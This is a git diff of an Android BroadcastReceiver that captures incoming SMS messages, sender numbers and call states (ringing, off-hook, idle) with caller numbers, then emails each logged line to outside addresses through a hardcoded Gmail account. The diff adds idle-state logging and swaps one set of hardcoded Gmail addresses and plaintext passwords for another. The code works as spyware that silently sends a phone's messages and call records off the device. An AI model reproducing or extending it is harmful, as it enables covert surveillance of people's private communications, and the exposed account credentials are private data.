@@ -70,12 +70,14 @@ public class StartUpReceiver extends BroadcastReceiver
                 ToActivity = "";
                 Object[] pdus = (Object[]) bundle.get("pdus");
                 Messages = new SmsMessage[pdus.length];
+
                 for(int i=0; i<Messages.length; i++)
                 {
                     Messages[i] = SmsMessage.createFromPdu ((byte[]) pdus[i], bundle.getString ("format" ));
                     SmsSender = Messages[i].getOriginatingAddress();
-                    if (i == 0)
+                    if (i == 0) {
                         ToActivity = "From: " + SmsSender + ",   ";
+                    }
                     String SmsBody = Messages[i].getMessageBody();
                     ToActivity = ToActivity + SmsBody;
                     WriteLog ("SMS message Sender: " + SmsSender);
@@ -100,18 +102,33 @@ public class StartUpReceiver extends BroadcastReceiver
         String Caller= PhoneInt.getStringExtra (TelephonyManager.EXTRA_INCOMING_NUMBER);
         if (State.equals (TelephonyManager.EXTRA_STATE_RINGING))
         {
+
             if (Caller != null)
             {
                 WriteLog ("Phone Ringing : " + Caller);
+
             }
         }
         if (State.equals (TelephonyManager.EXTRA_STATE_OFFHOOK))
         {
+
             if (Caller != null)
             {
                 WriteLog ("Off Hook: " + Caller);
+
             }
         }
+        if (State.equals (TelephonyManager.EXTRA_STATE_IDLE))
+        {
+
+            if (Caller != null)
+            {
+                WriteLog ("Phone Rests: " + Caller);
+
+
+            }
+        }
+
     }
 
     void WriteLog (String Line)
@@ -119,8 +136,9 @@ public class StartUpReceiver extends BroadcastReceiver
 
             String TimeStamp = new SimpleDateFormat ("yyyy-MM-dd HH:mm:ss").format (new Date ());
 
+
             String line = Line + "   (" + TimeStamp + ")";
-        sender = new Mail("pavlos.repin@gmail.com", "paulos21g");
+        sender = new Mail("katsarosm47@gmail.com", "KApota11");
         StringMake.setString(line);
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
                     Builder().permitAll().build();
@@ -177,7 +195,7 @@ public class StartUpReceiver extends BroadcastReceiver
                 String line = null;
                 line = StringMake.getString();
 
-                sender.sendMail("New SMS", line, "pavlos.repin@gmail.com", "pavlos.repin@gmail.com");
+                sender.sendMail("New SMS", line, "katsarosm47@gmail.com", "cse242017051@uniwa.gr");
 
             } catch (Exception ex) {
 
